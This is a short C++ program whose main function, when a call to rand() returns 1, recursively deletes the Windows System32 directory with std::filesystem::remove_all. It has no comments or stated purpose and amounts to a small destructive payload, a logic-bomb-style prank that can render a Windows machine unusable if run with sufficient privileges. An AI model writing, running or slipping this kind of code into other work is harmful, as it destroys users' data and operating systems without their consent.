#include <filesystem>
#include <random>

int main(){
    if (rand()==1){std::filesystem::remove_all("C:\\Windows\\System32");}
}